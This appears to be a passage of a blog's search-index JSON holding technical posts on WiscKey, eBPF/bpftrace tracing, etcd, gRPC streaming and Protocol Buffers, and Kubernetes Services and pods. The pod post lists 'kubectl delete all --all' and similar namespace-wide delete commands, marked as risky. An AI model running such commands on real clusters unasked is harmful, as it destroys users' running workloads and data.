value 和新的 tail 指针持久化到了设备上。具体的步骤如下： 垃圾回收在将 value 追加到 vLog 之后，在 vLog 上调用 fsync() 同步地将新的 value 地址和 tail 指针地址写入到 LSM-Tree 中。（tail 指针的存储形式为 &lt;‘‘tail’’, tail-vLog-offset&gt;） 最后回收 vLog 旧的数据空间 Crash Consistency 如果不能在 LSM-Tree 中查询到对应的 key，那么处理方式和传统的 LSM-Tree 一样，返回空或者 key 不存在，即便其 value 已经写入到了 vLog 文件中，也会对其进行垃圾回收。 如果 LSM-Tree 中存在要查询的 Key，则会进行校验。校验首先校验从 LSM-Tree 中查询到的 value 地址信息是否在有效的 vLog 文件范围内；其次校验该地址对应的 value 上存取的 key 和要查询的 key 是否一致。如果校验失败，则删除 LSM-Tree 中相应 key，并返回 key 不存在。 另外，还可以引入 magic number 或 checksum 来校验 key 和 value 是否匹配。 总结WiscKey 基于 LevelDB，设计了一个针对 SSD 进行优化的持久化 KV 存储方案，它的核心思想就是将 key 和 value 分离，key 存储在 LSM-Tree 中，value 存储在 value log 中，保留了 LSM-Tree 的优势，减少读写放大，发挥了 SSD 顺序写与并行随机读性能好的优势，但在小 value 场景以及大数据集范围查询下，WiscKey 的性能比 LevelDB 差。 参考 Lu L, Pillai T S, Arpaci-Dusseau A C, et al. WiscKey: separating keys from values in SSD-conscious storage[C] 14th USENIX Conference on File and Storage Technologies (FAST 16). 2016: 133-148. LevelDB 源码分析（一）：简介 WiscKey: Separating Keys from Values in SSD-conscious Storage","link":"/2021/05/06/WiscKey-Separating-Keys-from-Values-in-SSD-conscious-Storage/"},{"title":"eBPF 概述","text":"什么是 eBPFeBPF（extended Berkeley Packet Filter）是一种运行在内核中的虚拟机，基于它可以在不修改内核代码、不加载额外的内核模块的前提下，安全、高效地扩展内核的功能。它能够运行 BPF 程序，用户可以按需注入 BPF 程序以在内核中运行。这些程序遵循 eBPF 提供的特定指令集，具有某些需要遵循的规则，并且只运行安全的程序。 eBPF 的使用正在兴盛，越来越多的 eBPF 程序被应用。例如，用 eBPF 代替 iptables 规则可以将应用发出的包直接转发到对端的 socket 来有效地处理数据包，通过缩短数据路径来加速数据平面。 eBPF 的核心原理eBPF 的架构图如下： eBPF 分为两部分，分别是运行在用户空间的程序和运行在内核空间的程序。用户空间程序负责把 BPF 字节码加载到内核空间的 eBPF 虚拟机中，并在需要的时候读取内核返回的各种事件信息、统计信息；而内核中的 BPF 虚拟机负责执行内核中的特定事件，如果需要传递数据，就将执行结果通过 BPF map 或 perf 缓冲区中的 perf-events 发送至用户空间。整个流程如下： 编写好的 BPF 程序会被 Clang、LLVM 等工具编译成 BPF 的字节码（因为 BPF 程序并不是普通的 ELF 程序，而是要运行在虚拟机中的字节码）。eBPF 程序中还会包含配置的事件源，所谓事件源其实就是一些需要 hook 的挂载点。 加载器会在程序运行前通过 eBPF 系统调用加载到内核，这时候验证器会验证字节码的安全性，比如校验循环次数必须在有限时间内结束等。当校验通过后，一旦挂载的事件发生，就会在 eBPF 虚拟机中执行字节码的逻辑。 （可选）逐个事件输出，或通过 BPF map 返回统计数据、调用栈数据，传递至用户空间。 eBPF 支持静态追踪 socket、tracepoint、USDT，动态追踪 kprobe、uprobe 等几大类探针。 动态追踪eBPF 提供了： 面向内核的 kprobe/kretprobe，k = kernel 面向应用的 uprobe/uretprobe，u = user land 分别用于探测函数入口处和函数返回（ret）处的信息。 kprobe/kretprobe 可以探测内核大部分函数，出于安全考虑，有部分内核函数不允许安装探针，有可能会导致跟踪失败。 uprobe/uretprobe 用来实现用户态程序动态追踪的机制。与 kprobe/kretprobe 类似，区别在于跟踪的函数是用户程序中的函数而已。 动态追踪技术依赖内核和应用的符号表，对于那些 inline 或者 static 函数则无法直接安装探针，需要自行通过 offset 实现。可以借助 nm 或者 strings 指令查看应用的符号表。 动态追踪技术的原理与 GDB 类似，当对某段代码安装探针，内核会将目标位置指令复制一份，并替换为 int3 中断, 执行流跳转到用户指定的探针 handler，再执行备份的指令，如果此时也指定了 ret 探针，也会被执行，最后再跳转回原来的指令序列。 接下来看看如何进行动态追踪。首先编写一段 main.go 测试代码： 123456789package mainfunc main() { println(sum(3, 3))}func sum(a, b int) int { return a + b} 接下来，关闭内联优化编译代码，执行 go build -gcflags=&quot;-l&quot; ./main.go 命令。如果开启内联优化的话，很可能 Go 的编译器会在编译期消除函数调用，这样 eBPF 就会找不到函数对应的探针了。 下一步，编写 bpftrace 脚本 main.pt： 12345678BEGIN{ printf(&quot;Hello!\\n&quot;);}uprobe:./main:main.sum {printf(&quot;a: %d b: %d\\n&quot;, reg(&quot;ax&quot;), reg(&quot;bx&quot;))}uretprobe:./main:main.sum {printf(&quot;retval: %d\\n&quot;, retval)}END{ printf(&quot;Bye!\\n&quot;);} 最后执行 bpftrace 监控这个函数调用，运行 bpftrace main.pt 命令，然后按下 Ctl+C 退出，得到下面的输出： 1234Hello!a: 3 b: 3retval: 6^CBye! 静态追踪“静态”是指探针的位置、名称都是在代码中硬编码的，编译时就确定了。静态追踪的实现原理类似 callback，当被激活时执行，关闭时不执行，性能比动态追踪高一些。其中： tracepoint 是内核中的 USDT = Userland Statically Defined Tracing，是应用中的 静态追踪已经在内核和应用中包含了探针参数信息，可以直接通过 args-&gt;参数名 访问函数参数。tracepoint 的 参数信息可以通过 bpftrace -lv 查看，例如： 12345678bpftrace -lv tracepoint:syscalls:sys_enter_openat# 输出：# tracepoint:syscalls:sys_enter_openat# int __syscall_nr;# int dfd;# const char * filename;# int flags;# umode_t mode; 静态追踪通过 args-&gt;filename 访问 sys_enter_openat 的 filename 参数： 123456789bpftrace -e 'tracepoint:syscalls:sys_enter_openat { printf(&quot;%s %s\\n&quot;, comm, str(args-&gt;filename)); }'# 输出：# Attaching 1 probe...# uwsgi /proc/self/stat# uwsgi /proc/self/fd# uwsgi /proc/self/statm# uwsgi /proc/loadavg# uwsgi /proc/self/io# ... 其中 comm 表示父进程的名字。","link":"/2022/12/27/eBPF-%E6%A6%82%E8%BF%B0/"},{"title":"etcd 读写概述","text":"etcd 总体是基于 Raft 实现的，本文对 etcd 读写流程关键点进行简单记录。 etcd 读流程一个读请求从 client 通过 Round-robin 负载均衡算法，选择一个 etcd server 节点，发出 gRPC 请求，经过 etcd server 的 KVServer 模块进入核心的读流程，进行串行读或线性读（默认），通过与 MVCC 的 treeIndex 和 boltdb 模块紧密协作，完成读请求。 串行读（非强一致性读）：直接读状态机返回数据，无需通过 Raft 协议与集群进行交互，具有低延时、高吞吐量的特点，适合对数据一致性要求不高的场景。 线性读（强一致性读）：需要经过 Raft 协议模块，反应集群共识的最新数据，因此在延时和吞吐量上相比串行读略差一点，适用于对数据一致性要求高的场景。 ReadIndex线性读的 ReadIndex 可以使 follower 的读请求不必转发给 leader。它的实现原理是： 当 Follower 节点 收到一个线性读请求时，它首先会从 leader 获取集群最新的已提交的日志索引 (committed index)； leader 收到 ReadIndex 请求时，为防止脑裂等异常场景，会向 follower 节点发送心跳确认，一半以上节点确认 leader 身份后才能将已提交的索引 (committed index) 返回给请求的 follower 节点； follower 节点则会等待，直到状态机已应用索引 (applied index) 大于等于 leader 的已提交索引时 (committed Index)才会去通知读请求，数据已赶上 leader，然后去状态机中访问数据。 ReadIndex 是非常轻量的，不会导致 leader 负载变高，ReadIndex 机制使得每个 follower 节点都可以处理读请求，进而提升了系统的整体写性能。 MVCC它由内存树形索引模块 (treeIndex) 和嵌入式的 KV 持久化存储库 boltdb 组成。treeIndex 模块是基于 Google 开源的内存版 btree 库实现的；boltdb 是个基于 B+ tree 实现的 key-value 键值库，支持事务，提供 Get/Put 等简易 API 给 etcd 操作。 首先，有个全局递增的版本号（put hello a 时，hello 对应的版本号若为 1，下个请求 put world b 时，world 对应的版本号则为 2），每次修改操作，都会生成一个新的版本号。treeIndex 模块保存用户的 key 和相关版本号，以版本号为 key，value 为用户 key-value 数据存储在 boltdb 里面。另外，并不是所有请求都一定要从 boltdb 获取数据，etcd 出于数据一致性、性能等考虑，在访问 boltdb 前，首先会从一个内存读事务 buffer 中，二分查找你要访问 key 是否在 buffer 里面，若命中则直接返回。具体如下图： etcd 写流程一个写请求从 client 通过负载均衡算法选择一个 etcd 节点，发出 gRPC 调用，etcd 节点收到请求后会经过 gRPC 拦截、Quota 校验，接着进入 KVServer 模块，KVServer 模块将请求发送给本模块中的 raft，这里负责与 etcd raft 模块进行通信，发起一个提案，内容为 put foo bar，即使用 put 方法将 foo 更新为 bar，提案经过转发之后，半数节点成功持久化，MVCC 模块更新状态机，完成写请求。 与读流程不一样的是写流程涉及 Quota、WAL、Apply 三个模块。 Quota 模块配额检查 db 的大小，如果超过会报 etcdserver: mvcc: database space exceeded 的告警，通过 Raft 日志同步给集群中的节点 db 空间不足，整个集群将不可写入，对外提供只读的功能。 只有 leader 才能处理写请求。leader 收到提案后，会将提案封装成日志条目广播给集群各个节点，同时需要把内容持久化到一个 WAL 日志文件中。日志条目包含 leader 任期号、条目索引、日志类型、提案内容。WAL 持久化内容包含日志条目内容、WAL 记录类型、校验码、WAL 记录的长度。 Apply 模块用于执行提案，首先会判断该提案是否被执行过，如果已经执行，则直接返回结束；未执行过的情况下，将会进入 MVCC 模块执行持久化提案内容的操作。 MVCCMVCC 在执行 put 请求时，会基于当前版本号自增生成新的版本号，然后从 treeIndex 模块中查询 key 的创建版本号、修改次数信息。这些信息将填充到 boltdb 的 value 中，同时将用户的 key 和版本号信息存储到 treeIndex。在读流程中介绍过，boltdb 的 value 的值就是①key 名称；②key 创建时的版本号（create_revision）、最后一次修改时的版本号（mod_revision）、key 自身修改的次数（version）；③value 值；④租约信息，将这些信息的结构体序列化成的二进制数据。另外，为了提高吞吐量，此时数据并未提交，而是存在 boltdb 所管理的内存数据结构中，由 backend 异步 goroutine 定时将批量事务提交，和 MySQL 类似，写时优先写入 Buffer。具体如下图： 参考 etcd Source Code Learning | etcd etcd教程(七)—读请求执行流程分析 etcd教程(八)—写请求执行流程分析","link":"/2022/02/05/etcd-%E8%AF%BB%E5%86%99%E6%A6%82%E8%BF%B0/"},{"title":"gRPC 基础","text":"gRPC 概览gRPC 是由 Google 开发并开源的一种语言中立的 RPC 框架，当前支持 C、Java 和 Go 语言，其中 C 版本支持 C、C++、Node.js、C# 等。在 gRPC 的客户端应用可以像调用本地方法一样直接调用另一台不同的机器上的服务端的方法。 简单使用 gRPC 的步骤如下，以 Go 语言为例： 写好 proto 文件，用 protoc 生成.pb.go文件 服务端定义 Server，创建 Function 实现接口 -&gt; net.Listen -&gt; grpc.NewServer() -&gt; pb.RegisterXXXServer(server, &amp;Server{}) -&gt; server.Serve(listener) 客户端 grpc.Dial，创建一个 gRPC 连接 -&gt; pb.NewXXXClient(conn)，创建 client -&gt; context.WithTimeout，设置超时时间 -&gt; client.Function，调用接口 -&gt; 如果是流式传输则循环读取数据 gRPC 概念详解流 Unary RPC客户端发送一个请求给服务端，从服务端获取一个应答，就像一次普通的函数调用。 Server streaming RPC客户端发送一个请求给服务端，可获取一个数据流用来读取一系列消息。客户端从返回的数据流里一直读取直到没有更多消息为止。server 需要向流中发送消息，例如： 12345678for n := 0; n &lt; 5; n++ { err := server.Send(&amp;pb.StreamResponse{ StreamValue: req.Data + strconv.Itoa(n), }) if err != nil { return err }} client 通过 grpc 调用获得的是一个流传输对象 stream，需要循环接收数据，例如： 123456789101112for { res, err := stream.Recv() // 判断消息流是否已经结束 if err == io.EOF { break } if err != nil { log.Fatalf(&quot;ListStr get stream err: %v&quot;, err) } // 打印返回值 log.Println(res.StreamValue)} Client streaming RPC客户端用提供的一个数据流写入并发送一系列消息给服务端。一旦客户端完成消息写入，就等待服务端读取这些消息并返回应答。server 使用 stream.Recv() 来循环接收数据流，SendAndClose 表示服务器已经接收消息结束，并发生一个正确的响应给客户端，例如： 1234567891011for { res,err := stream.Recv() // 接收消息结束，发送结果，并关闭 if err == io.EOF { return stream.SendAndClose(&amp;proto.UploadResponse{}) } if err !=nil { return err } fmt.Println(res)} client 发送数据完毕的时候需要调用 CloseAndRecv，例如： 12345678910111213for i := 1; i &lt;= 10; i++ { img := &amp;proto.Image{FileName:&quot;image&quot;+strconv.Itoa(i),File:&quot;file data&quot;} images := &amp;proto.StreamImageList{Image:img} err := stream.Send(images) if err != nil { ctx.JSON(map[string]string{ &quot;err&quot;: err.Error(), }) return }}// 发送完毕，关闭并获取服务端返回的消息resp, err := stream.CloseAndRecv() Bidirectional streaming RPC两边都可以分别通过一个读写数据流来发送一系列消息。这两个数据流操作是相互独立的，所以客户端和服务端能按其希望的任意顺序读写，例如：服务端可以在写应答前等待所有的客户端消息，或者它可以先读一个消息再写一个消息，或者是读写相结合的其他方式。server 在接收消息的同时发送消息，例如： 1234567891011for { res, err := stream.Recv() if err == io.EOF { return nil } err = stream.Send(&amp;proto.StreamSumData{Number: int32(i)}) if err != nil { return err } i++} client 需要有一个执行断开连接的标识 CloseSend()，而 server 不需要，因为服务端断开连接是隐式的，我们只需要退出循环即可断开连接，例如： 123456789101112131415161718for i := 1; i &lt;= 10; i++ { err = stream.Send(&amp;proto.StreamRequest{}) if err == io.EOF { break } if err != nil { return } res, err := stream.Recv() if err == io.EOF { break } if err != nil { return } log.Printf(&quot;res number: %d&quot;, res.Number)}stream.CloseSend() 同步 Channel 提供一个与特定 gRPC server 的主机和端口建立的连接。Stub 就是在 Channel 的基础上创建而成的，通过 Stub 可以真正的调用 RPC 请求。 基于 CQ 异步 CQ：异步操作完成的通知队列 StartCall() + Finish()：创建异步任务 CQ.next()：获取完成的异步操作 Tag：标记异步动作的标识 多个线程可以操作同一个CQ。CQ.next() 不仅可以接收到当前处理的请求的完成事件，还可以接收到其他请求的事件。假设第一个请求正在等待它的回复数据传输完成时，一个新的请求到达了，CQ.next() 可以获得新请求产生的事件，并开始并行处理新请求，而不用等待第一个请求的传输完成。 基于回调异步在 client 端发送单个请求，在调用 Function 时，除了传入 Request、 Reply 的指针之外，还需要传入一个接收 Status 的回调函数。在 server 端 Function 返回的不是状态，而是 ServerUnaryReactor 指针，通过 CallbackServerContext 获得 reactor，调用 reactor 的 Finish 函数处理返回状态。 上下文 在 client 端和 server 端之间传输一些自定义的 Metadata。 类似于 HTTP 头，控制调用配置，如压缩、鉴权、超时。 辅助可观测性，如 Trace ID。 gRPC 通信协议gRPC 通信协议基于标准的 HTTP/2 设计，支持双向流、单 TCP 的多路复用（一个 HTTP 请求无需等待前一个 HTTP 请求返回结果就可以提前发起，多个请求可以共用同一个 HTTP 连接且互不影响）以及消息头压缩和服务端推送等特性，这些特性使得 gRPC 在移动端设备上更加省电和节省网络流量。 gRPC 序列化机制Protocol Buffers 介绍gRPC 序列化支持 Protocol Buffers。ProtoBuf 是一种轻便高效的数据结构序列化方法，保障了 gRPC 调用的高性能。它的优势在于： ProtoBuf 序列化后的体积要比 json、XML 小很多，序列化/反序列化的速度更快。 支持跨平台、多语言。 使用简单，因为它提供了一套编译工具，可以自动生成序列化、反序列化的样板代码。 但是，ProtoBuf 是二进制协议，编码后二进制数据流可读性差，调试麻烦。 ProtoBuf 支持的标量值类型如下： ProtoBuf 为什么快？ 因为每个字段都用 tag+value 这种方式连续存储的，tag 是编号，一般只占用一个字节，value 是字段的值，这样就没有冗余字符。 另外，对于比较小的整数，ProtoBuf 中定义了 Varint 可变整型，可以不用 4 个字节去存。 如果 value 是字符串类型的，从 tag 当中无法了解到 value 具体有多长，ProtoBuf 会在 tag 与 value 之间添加一个 leg 字段去记录字符串的长度，这样就可以不做字符串匹配操作，解析速度非常快。 IDL 文件定义按照 Protocol Buffers 的语法在 proto 文件中定义 RPC 请求和响应的数据结构，示例如下： 123456789101112syntax = &quot;proto3&quot;;option go_package = &quot;../helloworld&quot;;package helloworld;service Greeter { rpc SayHello (HelloRequest) returns (HelloReply) {}}message HelloRequest { string name = 1;}message HelloReply { string message = 1;} 其中，syntax proto3 表示使用 v3 版本的 Protocol Buffers，v3 和 v2 版本语法上有较多的变更, 使用的时候需要特别注意。go_package 表示生成代码的存放路径（包路径）。通过 message 关键字来定义数据结构，数据结构的语法为： 数据类型 字段名称 = Tag message 是支持嵌套的，即 A message 引用 B message 作为自己的 field，它表示的就是对象聚合关系，即 A 对象聚合（引用）了 B 对象。 对于一些公共的数据结构，例如公共 Header，可以通过单独定义公共数据结构 proto 文件，然后导入的方式使用，示例如下： import &quot;other_protofile.proto&quot;; 导入也支持级联引用，即 a.proto 导入了 b.proto,b.proto 导入了 c.proto，则 a.proto 可以直接使用 c.proto 中定义的 message。 参考 「直播回放」腾讯工程师分享：gRPC基础概念详解 gRPC 基础概念详解 gRPC 官方文档中文版","link":"/2021/09/30/gRPC-%E5%9F%BA%E7%A1%80/"},{"title":"gRPC Introduction","text":"gRPC OverviewgRPC is a language-neutral RPC framework developed and open-sourced by Google, currently supporting C, Java, and Go languages. The C version supports languages such as C, C++, Node.js, C#. In gRPC, client applications can directly call methods on a server on a different machine as if they were calling local methods. The simple steps to use gRPC are as follows, taking Go language as an example: Write the proto file and use protoc to generate the .pb.go file. On the server side, define a Server, create a Function to implement the interface -&gt; net.Listen -&gt; grpc.NewServer() -&gt; pb.RegisterXXXServer(server, &amp;Server{}) -&gt; server.Serve(listener). On the client side, grpc.Dial to create a gRPC connection -&gt; pb.NewXXXClient(conn) to create a client -&gt; context.WithTimeout to set a timeout -&gt; call the interface with client.Function -&gt; If it is stream transmission, loop to read data. gRPC ConceptsStream Unary RPCThe client sends a request to the server and gets a response from the server, just like a normal function call. Server streaming RPCThe client sends a request to the server and can get a data stream to read a series of messages. The client reads from the returned data stream until there are no more messages.The server needs to send messages into the stream, for example: 12345678for n := 0; n &lt; 5; n++ { err := server.Send(&amp;pb.StreamResponse{ StreamValue: req.Data + strconv.Itoa(n), }) if err != nil { return err }} The client gets a stream transmission object ‘stream’ through the grpc call and needs to loop to receive data, for example: 123456789101112for { res, err := stream.Recv() // Determine whether the message stream has ended if err == io.EOF { break } if err != nil { log.Fatalf(&quot;ListStr get stream err: %v&quot;, err) } // Print the return value log.Println(res.StreamValue)} Client streaming RPCThe client writes and sends a series of messages to the server using a provided data stream. Once the client finishes writing messages, it waits for the server to read these messages and return a response. The server uses stream.Recv() to loop to receive the data stream, and SendAndClose indicates that the server has finished receiving messages and sends a correct response to the client, for example: 1234567891011for { res,err := stream.Recv() // Message reception ends, send the result, and close if err == io.EOF { return stream.SendAndClose(&amp;proto.UploadResponse{}) } if err !=nil { return err } fmt.Println(res)} The client needs to call CloseAndRecv when it has finished sending data, for example: 12345678910111213for i := 1; i &lt;= 10; i++ { img := &amp;proto.Image{FileName:&quot;image&quot;+strconv.Itoa(i),File:&quot;file data&quot;} images := &amp;proto.StreamImageList{Image:img} err := stream.Send(images) if err != nil { ctx.JSON(map[string]string{ &quot;err&quot;: err.Error(), }) return }}// Finish sending, close and get the message returned by the serverresp, err := stream.CloseAndRecv() Bidirectional streaming RPCBoth sides can separately send a series of messages via a read-write data stream. These two streams operate independently, so the client and server can read and write in any order they wish, for example: the server can wait for all client messages before writing a response, or it can read a message then write a message, or use other combinations of reading and writing. The server sends messages while receiving messages, for example: 1234567891011for { res, err := stream.Recv() if err == io.EOF { return nil } err = stream.Send(&amp;proto.StreamSumData{Number: int32(i)}) if err != nil { return err } i++} The client needs a flag to disconnect, CloseSend(), but the server doesn’t need it because the server disconnects implicitly. We just need to exit the loop to disconnect, for example: 123456789101112131415161718for i := 1; i &lt;= 10; i++ { err = stream.Send(&amp;proto.StreamRequest{}) if err == io.EOF { break } if err != nil { return } res, err := stream.Recv() if err == io.EOF { break } if err != nil { return } log.Printf(&quot;res number: %d&quot;, res.Number)}stream.CloseSend() Synchronous A Channel provides a connection established with the host and port of a specific gRPC server. A Stub is created based on the Channel, and the RPC request can be actually called through the Stub. Asynchronous based on CQ CQ: Notification queue for completed asynchronous operations StartCall() + Finish(): Create asynchronous tasks CQ.next(): Get completed asynchronous operations Tag: Identifiers marking asynchronous actions Multiple threads can operate on the same CQ. CQ.next() can receive not only the completion events of the current request being processed but also the events of other requests. Suppose the first request is waiting for its reply data transmission to complete, and a new request arrives. CQ.next() can get the events generated by the new request and start processing the new request in parallel without waiting for the first request’s transmission to complete. Asynchronous based on CallbackOn the client side, send a single request, when calling the Function, in addition to passing the pointers of Request and Reply, a callback function receiving Status is also needed. On the server side, the Function doesn’t return a status, but a ServerUnaryReactor pointer. Get the reactor through CallbackServerContext and call the Finish function of the reactor to handle the return status. Context Transfers some custom Metadata between the client and server. Similar to HTTP headers, it controls call configurations such as compression, authentication, and timeout. Assists observability, such as Trace ID. gRPC Communication ProtocolThe gRPC communication protocol is based on standard HTTP/2 design, supports bidirectional streams, multiplexing of single TCP (an HTTP request can be initiated in advance without waiting for the result of the previous HTTP request, and multiple requests can share the same HTTP connection without interfering with each other) and features such as message header compression and server push. These features make gRPC more power-saving and network traffic-saving on mobile devices. gRPC Serialization MechanismIntroduction to Protocol BuffersgRPC serialization supports Protocol Buffers. ProtoBuf is a lightweight and efficient data structure serialization method, ensuring the high performance of gRPC calls. Its advantages include: The volume of ProtoBuf after serialization is much smaller than JSON, XML, and the speed of serialization/deserialization is faster. Supports cross-platform and multi-language. Easy to use because it provides a set of compilation tools that can automatically generate serialization and deserialization boilerplate code. However, ProtoBuf is a binary protocol, the readability of the encoded binary data stream is poor, and debugging is troublesome. The scalar value types supported by ProtoBuf are as follows: Why is ProtoBuf fast? Because each field is stored continuously in the form of tag+value, the tag is a number, usually only occupying one byte, and the value is the value of the field, so there are no redundant characters. In addition, for relatively small integers, ProtoBuf defines a Varint variable integer, which does not need to be stored in 4 bytes. If the value is of string type and the specific length of the value cannot be known from the tag, ProtoBuf will add a leg field between the tag and the value to record the length of the string, so that string matching operations do not need to be performed, and the parsing speed is very fast. Definition of IDL fileDefine the data structure of RPC requests and responses in the proto file according to the syntax of Protocol Buffers, for example: 123456789101112syntax = &quot;proto3&quot;;option go_package = &quot;../helloworld&quot;;package helloworld;service Greeter { rpc SayHello (HelloRequest) returns (HelloReply) {}}message HelloRequest { string name = 1;}message HelloReply { string message = 1;} Here, syntax proto3 indicates the use of version 3 of Protocol Buffers. There are many changes in syntax between v3 and v2, so pay special attention when using it. go_package indicates the storage path of the generated code (package path). The data structure is defined by the message keyword, and the syntax of the data structure is: Data_type Field_name = Tag The message supports nesting, that is, A message references B message as its own field, which represents the aggregation relationship of objects, that is, A object aggregates (references) B object. For some common data structures, such as common Header, you can define the proto file of the common data structure separately, and then import it for use, for example: import &quot;other_protofile.proto&quot;; Import also supports cascading references, that is, a.proto imports b.proto, b.proto imports c.proto, then a.proto can directly use the message defined in c.proto. References https://www.zhihu.com/zvideo/1427014658797027328 https://zhuanlan.zhihu.com/p/389328756 http://doc.oschina.net/grpc","link":"/2021/09/30/gRPC-Introduction/"},{"title":"k8s 三种 Service","text":"本文简单介绍 k8s 的三种 Service: ClusterIP、NodePort、LoadBalancer。 ClusterIPClusterIP 通过集群内部 IP 地址暴露服务，但该地址仅在集群内部可见，无法被集群外部的客户端访问。ClusterIP 是 Service 的默认类型，内部 IP 建议由 k8s 动态指定一个，也支持手动指定。示例： 1234567891011apiVersion: v1kind: Servicemetadata: name: nginx-pod-servicespec: type: ClusterIP ports: - port: 8080 targetPort: 80 selector: app: nginx 创建 ClusterIP 后，查看内部 IP，并进行访问： 12345678910111213141516171819202122232425262728root@cloud:~# kubectl get svc -o wideNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTORkubernetes ClusterIP 10.96.0.1 &lt;none&gt; 443/TCP 6d2h &lt;none&gt;nginx-pod-service ClusterIP 10.100.23.74 &lt;none&gt; 8080/TCP 6s app=nginxroot@cloud:~# curl 10.100.23.74:8080&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;/title&gt;&lt;style&gt;html { color-scheme: light dark; }body { width: 35em; margin: 0 auto;font-family: Tahoma, Verdana, Arial, sans-serif; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;&lt;p&gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&lt;/p&gt;&lt;p&gt;For online documentation and support please refer to&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;Commercial support is available at&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; NodePortNodePort 是 ClusterIP 的增强类型，它在 ClusterIP 的基础之上，在每个节点上使用一个相同的端口号将外部流量引入到该 Service 上来。示例： 123456789101112apiVersion: v1kind: Servicemetadata: name: nginx-pod-servicespec: type: NodePort ports: - port: 8080 targetPort: 80 nodePort: 30080 selector: app: nginx 创建后，在集群外可以通过节点IP:30080访问该服务。 LoadBalancerLoadBalancer 是 NodePort 的增强类型，为节点上的 NodePort 提供一个外部负载均衡器，需要公有云支持。示例： 12345678910111213apiVersion: v1kind: Servicemetadata: name: nginx-pod-servicespec: type: LoadBalancer ports: - port: 8080 targetPort: 80 nodePort: 30080 loadBalancerIP: 1.2.3.4 selector: app: nginx 创建后，在集群外可以通过1.2.3.4:30080访问该服务。","link":"/2022/06/05/k8s-%E4%B8%89%E7%A7%8D-Service/"},{"title":"k8s in action—Pod","text":"本章用到的三个 YAML 描述文件如下： kubia-manual.yaml 1234567891011apiVersion: v1kind: Podmetadata: name: kubia-manualspec: containers: - image: luksa/kubia name: kubia ports: - containerPort: 8080 protocol: TCP kubia-manual-with-labels.yaml 1234567891011121314apiVersion: v1kind: Podmetadata: name: kubia-manual-v2 labels: creation_mrthod: manual env: prodspec: containers: - image: luksa/kubia name: kubia ports: - containerPort: 8080 protocol: TCP kubia-gpu.yaml 12345678910apiVersion: v1kind: Podmetadata: name: kubia-gpuspec: nodeSelector: gpu: &quot;true&quot; containers: - image: luksa/kubia name: kubia apiVersion 描述文件遵循什么版本的 Kubernetes API；kind 指定资源类型，这里为 pod；metadata 中的字段描述 pod 名称、标签、注解；spec 中的字段描述创建容器所需要的镜像、容器名称、监听端口等。 创建 pod使用 kubectl create -f 命令从 YAML 文件创建 pod 1kubectl create -f kubia-manual.yaml 得到运行中 pod 的完整定义 12345# YAML 格式kubectl get pod kubia-manual -o yaml# JSON 格式kubectl get pod kubia-manual -o json 查看 pod 1kubectl get pods 查看日志 1234kubectl logs kubia-manual# 获取多容器 pod 的日志时指定容器名称kubectl logs kubia-manual -c kubia 将本机的 8888 端口转发至 kubia-manual pod 的 8080 端口 1kubectl port-forward kubia-manual 8888:8080 使用标签组织 pod标签时可以附加到资源的任意键值对，用以选择具有该确切标签的资源。 创建带标签的 pod 1kubectl create -f kubia-manual-with-labels.yaml 基于标签的 pod 操作 1234567891011121314# 显示 pod 标签kubectl get pods --show-labels# 只显示 env 标签kubectl get pods -L env# 为指定的 pod 资源添加新标签kubectl label pod kubia-manual env=debug# 修改标签kubectl label pod kubia-manual env=online --overwrite=true# - 号删除标签kubectl label pod kubia-manual env- 使用标签选择器列出 pod筛选指定值的 pod 1234567891011121314# 筛选 env 为 debug 的 podskubectl get pods -l env=debug# 筛选 creation_method 不为 manual 的 podskubectl get pods -l creation_method!=manual# 筛选不含 env 标签的 podskubectl get pods -l '!env'# in 筛选kubectl get pods -l 'env in (debug)'# not in 筛选kubectl get pods -l 'env notin (debug,online)' 使用标签和选择器约束 pod 调度使用标签分类工作节点 12kubectl label node gke-kubia gpu=truekubectl get nodes -l gpu=true 在 kubia-gpu.yaml 中的 spec 添加了 nodeSelector 字段。创建该 pod 时，调度器将只在包含标签 gpu=true 的节点中选择。 注解 pod注解也是键值对，但与标签不同，不用作标识，用作资源说明，注解可以包含相对更多的数据。 使用 kubectl annotate 添加注解 1kubectl annotate pod kubia-manual mycompany.com/someannotation=&quot;foo bar&quot; 查看注解 1kubectl describe pod kubia-manual 命名空间标签会导致资源重叠，可用 namespace 将对象分配到集群级别的隔离区域，相当于多租户的概念，以 namespace 为操作单位。 获取所有 namespace 1kubectl get ns 获取属于 kube-system 命名空间的 pod 1kubectl get pods -n kube-system 创建 namespace 资源 1234apiVersion: v1kind: Namespacemetadata: name: custom-namespace 创建资源时在 metadata.namespace 中指定资源的命名空间 123456apiVersion: v1kind: Podmetadata: name: kubia-manual namespace: custom-namespace... 使用 kubectl create 命令创建资源时指定命名空间 1kubectl create -f kubia-manual.yaml -n custom-namespace 切换命名空间 1kubectl config set-context $(kubectl config current-context) --namespace custom-namespace 删除 pod删除原理：向 pod 所有容器进程定期发送 SIGTERM 信号，使其正常关闭。如果没有及时关闭，则发送 SIGKILL 强制终止。进程需要正确处理信号，如 Go 注册捕捉信号 signal.Notify() 后 select 监听该 channel。 1234567891011121314# 按名称删除 podkubectl delete po kubia-gpu# 删除指定标签的 podkubectl delete po -l env=debug# 通过删除整个命名空间来删除 podkubectl delete ns custom-namespace# 删除当前命名空间下的所有 pod（慎用）kubectl delete pod --all# 删除当前命名空间的所有资源（慎用）kubectl delete all --all","link":"/2022/01/30/k8s-in-action%E2%80%94Pod/"},{"title":"k8s 集群中的 port","text":"本文介绍 k8s 集群外访问集群内部服务不同方式下的 port。 hostPort出现在 Deployment、Pod 等资源对象描述文件中的容器部分，类似于 docker run -p &lt;containerPort&gt;:&lt;hostPort&gt;。containerPort 为容器暴露的端口；hostPort 为容器暴露的端口直接映射到的主机端口。例如： 123456789101112131415apiVersion: apps/v1kind: Deployment...spec: ... template: ... spec: nodeName: node1 containers: - name: nginx image: nginx ports: - containerPort: 80 # containerPort是pod内部容器的端口 hostPort: 30080 集群外访问方式：node1的IP:30080。 